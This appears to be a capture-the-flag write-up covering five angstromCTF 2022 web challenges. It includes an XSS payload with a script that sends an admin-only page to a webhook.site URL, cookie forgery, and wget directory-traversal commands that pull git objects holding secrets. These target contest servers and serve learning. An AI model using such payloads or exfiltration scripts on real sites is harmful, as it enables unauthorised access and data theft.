# AngstromCTF - Web Exploitation

## The Flash (40 pts)

> The new Justice League movies nerfed the Flash, so clam made his [own rendition](https://the-flash.web.actf.co/)! Can you get the flag before the Flash swaps it out at the speed of light?

The site is simple white page with a large text in the center saying `actf{this_is_not_the_flag!}`. But if you watch it for a few second, it briefly changes to a different text.

The source code includes a JavaScript file called `flash.js`, whose code (beautified) is shown below:

```js
const _0x15c166 = _0x43fe;
(function(_0x20ab81, _0xdea176) {
    const _0x3bb316 = _0x43fe,
        _0x25fbaf = _0x20ab81();
    while (!![]) {
        try {
            const _0x58137d = -parseInt(_0x3bb316(0xd4, 'H3tY')) / 0x1 + -parseInt(_0x3bb316(0xd7, 'nwZz')) / 0x2 + parseInt(_0x3bb316(0xe1, '%[Nl')) / 0x3 + parseInt(_0x3bb316(0xd6, 'ub7C')) / 0x4 * (-parseInt(_0x3bb316(0xe7, '3RP4')) / 0x5) + parseInt(_0x3bb316(0xd9, '9V4u')) / 0x6 + parseInt(_0x3bb316(0xdf, 't*r!')) / 0x7 * (parseInt(_0x3bb316(0xcf, 'SMMO')) / 0x8) + parseInt(_0x3bb316(0xe2, '6%rI')) / 0x9 * (parseInt(_0x3bb316(0xe6, '3RP4')) / 0xa);
            if (_0x58137d === _0xdea176) break;
            else _0x25fbaf['push'](_0x25fbaf['shift']());
        } catch (_0xa016d7) {
            _0x25fbaf['push'](_0x25fbaf['shift']());
        }
    }
}(_0x4733, 0xacded));
const x = document['getElementById'](_0x15c166(0xe5, 'q!!U'));
setInterval(() => {
    const _0x24a935 = _0x15c166;
    Math[_0x24a935(0xd1, '&EwH')]() < 0.05 && (x[_0x24a935(0xdc, '1WY2')] = [0x73, 0x71, 0x80, 0x6e, 0x89, 0x81, 0x84, 0x41, 0x41, 0x70, 0x8b, 0x65, 0x78, 0x43, 0x79, 0x6f, 0x65, 0x80, 0x7c, 0x41, 0x65, 0x6e, 0x78, 0x40, 0x81, 0x7c, 0x87][_0x24a935(0xdb, 'H3tY')](_0x4cabe2 => String[_0x24a935(0xd8, 'Ceiy')](_0x4cabe2 - 0xd ^ 0x7))[_0x24a935(0xe0, '1WY2')](''), setTimeout(() => x[_0x24a935(0xe3, '5HF&')] = _0x24a935(0xde, '($xo'), 0xa));
}, 0x64);
```

The first half of this script is not important for finding the flag. I decoded the second half of the script below:

```js
const x = document['getElementById']('flash'));
setInterval(() => {
    const _0x24a935 = _0x15c166;
    Math['random']() < 0.05 && (x['innerText'] = [0x73, 0x71, 0x80, 0x6e, 0x89, 0x81, 0x84, 0x41, 0x41, 0x70, 0x8b, 0x65, 0x78, 0x43, 0x79, 0x6f, 0x65, 0x80, 0x7c, 0x41, 0x65, 0x6e, 0x78, 0x40, 0x81, 0x7c, 0x87]['map'](c => String['fromCharCode'](c - 0xd ^ 0x7))['join'](''), setTimeout(() => x['innerText'] = 'actf{this_is_not_the_flag!}', 0xa));
}, 0x64);
```

The flag is encoded in the form of the list of hexadecimals, and each letter can be recovered by mathmatical calculation, as seen below:

```python
>>> intext = [0x73, 0x71, 0x80, 0x6e, 0x89, 0x81, 0x84, 0x41, 0x41, 0x70, 0x8b, 0x65, 0x78, 0x43, 0x79, 0x6f, 0x65, 0x80, 0x7c, 0x41, 0x65, 0x6e, 0x78, 0x40, 0x81, 0x7c, 0x87]
>>> out = ""
>>> for i in intext:
...     out += chr(i - 0xd ^ 0x7)
... 
>>> out
'actf{sp33dy_l1ke_th3_fl4sh}'
```

**Flag: `actf{sp33dy_l1ke_th3_fl4sh}`**

## Auth Skip (40 pts)

> Clam was doing his angstromCTF flag% speedrun when he ran into [the infamous timesink](https://auth-skip.web.actf.co/) known in the speedrunning community as "auth". Can you pull off the legendary auth skip and get the flag?
>
> [Source](https://files.actf.co/6abd10658e6dadacc1a15ae557f858ddf1b5f32b97788ed4727938afee2fd2bb/index.js)

The webpage is a simple login page demanding username-password combination. It relays the user input to the `/login` page in `POST` method. The header information reveals that it is an Express.js web application(`X-Powered-By: Express`). Below is the source code for the server.

```js
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.post("/login", (req, res) => {
    if (
        req.body.username !== "admin" ||
        req.body.password !== Math.random().toString()
    ) {
        res.status(401).type("text/plain").send("incorrect login");
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
    }
});

app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

The script source file reveals that, in order to get the flag, you need to manipulate the cookie. The flag is accessible by adding `user=admin` key-value pair to the cookie and accessing the main page.

**Flag: `actf{passwordless_authentication_is_the_new_hip_thing}`**

## crumbs (50 pts)

> Follow the [crumbs](https://crumbs.web.actf.co/).
>
> Server: [index.js](https://files.actf.co/07899b85b650719a814695a0b6616e3b78af90d49c012f8f581b2bb699f6f547/index.js)

The main page simply directs us to a different page:

```text
Go to 61f57d99-6d8e-4e5e-bfc1-995dc358fce7
```

When you follow the direction, the resulting page directs us to another page. This continues for a while.

```text
Go to 24c73741-cdd9-4c76-bf79-fb82304a6ceb
Go to 1eb4cc3f-204b-4ba2-acd7-30d833676347
Go to 2a929590-7fe9-4112-b7d4-58f816e868a0
...
```

The server script shows that this trail will continue for 1,000 steps.

```js
const express = require("express");
const crypto = require("crypto");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

const paths = {};
let curr = crypto.randomUUID();
let first = curr;

for (let i = 0; i < 1000; ++i) {
    paths[curr] = crypto.randomUUID();
    curr = paths[curr];
}

paths[curr] = "flag";

app.use(express.urlencoded({ extended: false }));

app.get("/:slug", (req, res) => {
    if (paths[req.params.slug] === "flag") {
        res.status(200).type("text/plain").send(flag);
    } else if (paths[req.params.slug]) {
        res.status(200)
            .type("text/plain")
            .send(`Go to ${paths[req.params.slug]}`);
    } else {
        res.status(200).type("text/plain").send("Broke the trail of crumbs...");
    }
});

app.get("/", (req, res) => {
    res.status(200).type("text/plain").send(`Go to ${first}`);
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

It would be better to automate this task than to traverse the site manually. [like I did below](web/crumbs.py).

```python
import requests

conn = requests.get("https://crumbs.web.actf.co")
resp = conn.content.decode()
print(resp)
while resp[:5] == "Go to":
    conn = requests.get("https://crumbs.web.actf.co/" + resp[6:])
    resp = conn.content.decode()
    print(resp)

```

This script takes several minutes to yield the flag.

**Flag: `actf{w4ke_up_to_th3_m0on_6bdc10d7c6d5}`**

## Xtra Salty Sardines (70 pts)

> Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote a site with an [extremely suggestive acronym](https://xtra-salty-sardines.web.actf.co/)?
>
>[Source](https://files.actf.co/7173d383e018e4398019bc1990706545915b0ab3a36664b103b3454fb11afd64/index.js), [Admin Bot](https://admin-bot.actf.co/xtra-salty-sardines)

```text
```

```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;
const sardines = {};

const alpha = "abcdefghijklmnopqrstuvwxyz";

const secret = process.env.ADMIN_SECRET || "secretpw";
const flag = process.env.FLAG || "actf{placeholder_flag}";

function genId() {
    let ret = "";
    for (let i = 0; i < 10; i++) {
        ret += alpha[Math.floor(Math.random() * alpha.length)];
    }
    return ret;
}

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// the admin bot will be able to access this
app.get("/flag", (req, res) => {
    if (req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});

app.post("/mksardine", (req, res) => {
    if (!req.body.name) {
        res.status(400).type("text/plain").send("please include a name");
        return;
    }
    // no pesky chars allowed
    const name = req.body.name
        .replace("&", "&amp;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
        .replace("<", "&lt;")
        .replace(">", "&gt;");
    if (name.length === 0 || name.length > 2048) {
        res.status(400)
            .type("text/plain")
            .send("sardine name must be 1-2048 chars");
        return;
    }
    const id = genId();
    sardines[id] = name;
    res.redirect("/sardines/" + id);
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});


app.get("/sardines/:sardine", (req, res) => {
    const name = sardines[req.params.sardine];
    if (!name) {
        res.status(404).type("text/plain").send("sardine not found :(");
        return;
    }
    const sardine = fs
        .readFileSync(path.join(__dirname, "sardine.html"), "utf8")
        .replaceAll("$NAME", name.replaceAll("$", "$$$$"));
    res.type("text/html").send(sardine);
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});

```

When I try to inject HTML code into the sardine, it seems as the input would be sanitized. However, this happens only to the first tag of the input; the rest of the tags would be unsanitized and executed.

Since the sardine program stores each input with unique URI, we can upload the attacking code to the program and make the Admin bot visit the sardine. Due to the same origin policies,

```html
<>'""'aa<iframe id='f1' src='https://xtra-salty-sardines.web.actf.co/flag'></iframe><div id='ww'></div><script src='(REDACTED_SCRIPT_LOCATION)'></script>
```

Below is [the script](web/xss.js) that I used. The script grabs the content of the flag page and sends it to my [Webhook](https://webhook.site) page where every request it receives is revealed.

```js
const sleep = (ms) => {
    const stop = new Date().getTime() + ms;
    while (new Date().getTime() < stop) {}
};

sleep(3000);

var flag = window.frames[0].document.body.innerHTML;

document.getElementById('ww').innerHTML='<img src="https://webhook.site/58d53da3-******************?msg='+flag+'">';
```

**Flag: `actf{those_sardines_are_yummy_yummy_in_my_tummy}`**

## Art Gallery (100 pts)

> bosh left his [image gallery](https://art-gallery.web.actf.co) service running.... quick, git all of his secrets before he deletes them!!! [source](https://files.actf.co/402c73bf8676ad4d4a12aac56075d2dc04ead83f5d332cbd3d1cfb568315f789/index.js)

The site has a drop-down box with four options. Clicking the `Submit` button loads different images depending on the selected value of the drop-down box.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>
            Angstrom Food Art Gallery
        </title>
    </head>
    <body>
        <h1>
            Angstrom Food Art Gallery
        </h1>
        <h2>
            See all of your favorite food-related Angstrom members from the secret blairsec repo
        </h2>
        <form action="/gallery">
            <select name="member">
                <option value="aplet.jpg">aplet</option>
                <option value="cavocado.jpg">cavocado</option>
                <option value="clam.jpg">clam</option>
                <option value="emh.jpg">evilmuffinha</option>
            </select>
            <input type="submit" value="Submit">
        </form>
    </body>
</html>
```

```js
const express = require('express');
const path = require("path");

const app = express();
const port = Number(process.env.PORT) || 8080;

app.get("/gallery", (req, res) => {
    res.sendFile(path.join(__dirname, "images", req.query.member), (err) => {
        res.sendFile(path.join(__dirname, "error.html"))
    });
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

This script reveals important information. All of the images are located in the `images` directory which is under the main directory of the server. Also, this site is vulnerable to directory traversal attack; it means that we can access the files in upper directories using `..` keyword.

The site states that the files are from a git repository. Therefore, the `.git` directory exists somewhere, and its files can be accessed through directory traversal.

I was able to download various files from `.git` directory of the website. I found [a tool](https://github.com/b1fair/get-git-object) that helps interpret the compressed git data files.

```text
/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ wget https://art-gallery.web.actf.co/gallery?member=../.git/logs/HEAD -O logs/HEAD
--2022-05-22 21:38:45--  https://art-gallery.web.actf.co/gallery?member=../.git/logs/HEAD
Resolving art-gallery.web.actf.co (art-gallery.web.actf.co)... 35.194.95.171
Connecting to art-gallery.web.actf.co (art-gallery.web.actf.co)|35.194.95.171|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 488 [application/octet-stream]
Saving to: ‘logs/HEAD’

logs/HEAD                                  100%[========================================================================================>]     488  --.-KB/s    in 0s       

2022-05-22 21:38:46 (167 MB/s) - ‘logs/HEAD’ saved [488/488]

/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ cat logs/HEAD 
0000000000000000000000000000000000000000 56449caeb7973b88f20d67b4c343cbb895aa6bc7 fraendt <**********@gmail.com> 1651023841 -0400 commit (initial): add program
56449caeb7973b88f20d67b4c343cbb895aa6bc7 713a4aba8af38c9507ced6ea41f602b105ca4101 fraendt <**********@gmail.com> 1651023888 -0400 commit: remove vital secrets        
713a4aba8af38c9507ced6ea41f602b105ca4101 1c584170fb33ae17a63e22456f19601efb1f23db fraendt <**********@gmail.com> 1651024065 -0400 commit: bury secrets
```

We can see that the hash for the initial commit is `56449caeb7973b88f20d67b4c343cbb895aa6bc7`. When I downloaded the corresponding object and decoded it, I got another hash (`ff511529549e4a9376c897df27e001a909caa933`) for the object that shows the tree of the original commit.

```text
/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ python3 gitit.py objects/56/449caeb7973b88f20d67b4c343cbb895aa6bc7
b'commit 171\x00tree ff511529549e4a9376c897df27e001a909caa933\nauthor imposter <sus@aplet.me> 1651023841 -0400\ncommitter fraendt <**********@gmail.com> 1651023841 -0400\n\nadd program\n'

/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ python3 ../gitdown.py
Object hash: ff511529549e4a9376c897df27e001a909caa933
ff/511529549e4a9376c897df27e001a909caa933
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   243  100   243    0     0    243      0  0:00:01 --:--:--  0:00:01   243

/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ python3 gitit.py objects/ff511529549e4a9376c897df27e001a909caa933
b'tree 266\x00100644 error.html\x00\x8a\xba9\xc0\xcc\x9eNH5yo\xf0\x1b\x98\xc8k\x8b\xc8\x1b\x01100644 flag.txt\x00x\x0f\x86G\x15\t\x9av\x12\xef\xae:<\xdb\xcc\xde\x05\xa0\xad\xc440000 images\x00\\\x1f\xf2i\xbd\xdd2\xdb\xe3\x17"\xb4\x99\x18\x99G\xfb\xd84j100644 index.html\x006x\x13e\xca\xfa\xe9;<\xd8\xdb\xc5E\x0eb\xc0\xebW\xae\xea100644 index.js\x00?\xbbU~UX\xae\xc5b\x95\xc7\xf5~-S\xf4Q\xd7v\xcc100644 package-lock.json\x00\xa5\xb3\xc07\x85sb\x15\xa4\xba\xa6t\x0b^Y^\xacr\xec\xc1100644 package.json\x00\xab\x8a\xd5\xc7\xabU\xaa-f\xb9\xc4\xa9\x04\x1f\x13\xe2\x98\xa3\xc1\x8f'
```

The initial commit object shows the existence of a file named `flag.txt`. The data after the file name and the null character seems to be the hash value (`x\x0f\x86G\x15\t\x9av\x12\xef\xae:<\xdb\xcc\xde\x05\xa0\xad\xc4`) of the object that contains this file. What we need to do here is to convert this into the hex value. I wrote [a script](web/artgallery/gitdown.py) that simplifies the task of downloading various git objects.

```python
>>> bb = b"x\x0f\x86G\x15\t\x9av\x12\xef\xae:<\xdb\xcc\xde\x05\xa0\xad\xc4"
>>> import binascii
>>> binascii.hexlify(bb)
b'780f864715099a7612efae3a3cdbccde05a0adc4'
>>> exit()
```

Now that we have the object name, we can download it and interpret its data.

```text
/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ python3 gitdown.py 
Object hash: 780f864715099a7612efae3a3cdbccde05a0adc4
78/0f864715099a7612efae3a3cdbccde05a0adc4
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    59  100    59    0     0     58      0  0:00:01  0:00:01 --:--:--    58
/mnt/d/GitHub/angstromCTF2022/web/artgallery/.git$ python3 ../gitit.py objects/780f864715099a7612efae3a3cdbccde05a0adc4 
b'blob 45\x00actf{lfi_me_alone_and_git_out_341n4kaf5u59v}'
```

**Flag: `actf{lfi_me_alone_and_git_out_341n4kaf5u59v}`**
